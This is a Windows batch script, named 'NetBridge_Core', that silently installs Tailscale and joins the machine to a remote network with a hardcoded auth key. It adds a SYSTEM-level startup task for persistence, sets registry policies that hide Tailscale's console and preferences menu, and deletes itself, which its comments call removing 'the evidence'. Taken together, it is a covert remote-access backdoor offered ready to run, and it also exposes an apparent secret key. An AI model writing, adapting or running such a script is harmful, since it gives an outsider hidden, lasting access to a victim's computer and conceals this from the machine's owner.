@echo off
SETLOCAL
:: Run as Admin check
net session >nul 2>&1 || (echo Open as Admin! & pause & exit)

:: --- CONFIGURATION ---
set "CLIENT_ID=krKNwaU6kV11CNTRL"
set "CLIENT_SECRET=tskey-client-krKNwaU6kV11CNTRL-xKwY1YogGBWvdZxokNcRBWirquyM3kue"
set "TOOL_NAME=NetBridge_Core"

echo [%TOOL_NAME%] Initializing...

:: 1. Download & Silent Install
powershell -Command "Invoke-WebRequest -Uri 'https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe' -OutFile 'setup.exe'"
start /wait setup.exe /quiet /norestart

:: 2. Configure for Always-On / Startup
:: --unattended: Keeps the connection alive even if no one is logged in.
:: --accept-routes: Ensures the network path is active.
"C:\Program Files\Tailscale\tailscale.exe" up --authkey="%CLIENT_SECRET%?ephemeral=false" --unattended --accept-routes

:: 3. Create Persistence (The "Always Run" Insurance)
:: This creates a Windows Scheduled Task that triggers at every System Startup.
schtasks /create /tn "%TOOL_NAME%_KeepAlive" /tr "'C:\Program Files\Tailscale\tailscale.exe' up" /sc onstart /ru SYSTEM /rl highest /f

:: 4. Hide Presence from UI
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Tailscale" /v AdminConsole /t REG_SZ /d "hide" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Tailscale" /v PreferencesMenu /t REG_SZ /d "hide" /f

:: 5. Self-Destruct Script (Removes the evidence)
echo [%TOOL_NAME%] Setup Complete. Node is permanent.
del setup.exe
(goto) 2>nul & del "%~f0"